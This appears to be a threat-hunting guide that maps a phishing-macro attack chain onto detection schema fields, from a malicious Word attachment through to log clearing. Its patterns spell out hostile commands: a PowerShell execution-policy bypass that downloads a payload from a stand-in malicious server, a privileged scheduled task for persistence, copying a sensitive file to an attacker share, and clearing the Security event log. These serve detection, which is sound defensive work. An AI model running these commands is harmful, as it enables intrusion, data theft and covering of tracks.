1. **Identify Initial Access via Email**  
   - Monitor for the creation of processes related to Outlook that involve email interactions. Specifically, look for emails with subject lines containing "Invoice Attached" and attachments named "Invoice_12345.docx".  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE" (or similar path for Outlook)  
     - `dstNode.Type`: "File"  
     - `dstNode.Name`: "Invoice_12345.docx"  

2. **Identify Opening of Malicious Attachment**  
   - Monitor for the execution of Microsoft Word when the attachment is opened. Look for processes that indicate a macro is set to run automatically.  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" (or similar path for Word)  
     - `dstNode.Type`: "File"  
     - `dstNode.Name`: "Invoice_12345.docx"  

3. **Identify Execution of the Macro**  
   - Monitor for PowerShell commands executed via Microsoft Word macros. Specifically, look for commands that download scripts from remote servers.  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"  
     - `dstNode.Type`: "Process"  
     - `dstNode.Image`: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"  
     - `dstNode.Cmdline`: `-ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://malicious-server.com/payload.ps1 -OutFile C:\\Users\\Public\\payload.ps1"`  

4. **Identify Downloading of the Payload**  
   - Monitor for the execution of PowerShell commands that download payload scripts to the local system.  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"  
     - `dstNode.Type`: "File"  
     - `dstNode.Name`: "C:\\Users\\Public\\payload.ps1"  

5. **Identify Execution of the Downloaded Payload**  
   - Monitor for the execution of the downloaded PowerShell script. Look for commands that execute the script from the local system.  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"  
     - `dstNode.Type`: "File"  
     - `dstNode.Name`: "C:\\Users\\Public\\payload.ps1"  
     - `dstNode.Cmdline`: `-ExecutionPolicy Bypass -File C:\\Users\\Public\\payload.ps1`  

6. **Identify Establishing Persistence**  
   - Monitor for PowerShell commands that create scheduled tasks for persistence. Look for commands that specify task creation with the PowerShell script.  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"  
     - `dstNode.Type`: "Process"  
     - `dstNode.Cmdline`: `schtasks /create /tn "MaliciousTask" /tr "powershell.exe -File C:\\Users\\Public\\payload.ps1" /sc onlogon /rl highest`  

7. **Identify Data Exfiltration or Lateral Movement**  
   - Monitor for PowerShell commands that indicate data exfiltration or lateral movement within the network. Look for commands that access sensitive data and send it to an external server.  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"  
     - `dstNode.Type`: "Network"  
     - `dstNode.Dstaddress`: "attacker-server"  
     - `dstNode.Port`: 443  
     - `dstNode.Cmdline`: `Invoke-Command -ScriptBlock { Get-Content C:\\Users\\Public\\SensitiveData.txt } | Out-File \\\\attacker-server\\exfiltrated_data.txt`  

8. **Identify Cleanup and Covering Tracks**  
   - Monitor for PowerShell commands that clear event logs or delete evidence of execution. Look for commands that indicate log clearing activities.  
   - Schema Fields:  
     - `srcNode.Type`: "Process"  
     - `srcNode.Image`: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"  
     - `dstNode.Type`: "Process"  
     - `dstNode.Cmdline`: `wevtutil cl Security`  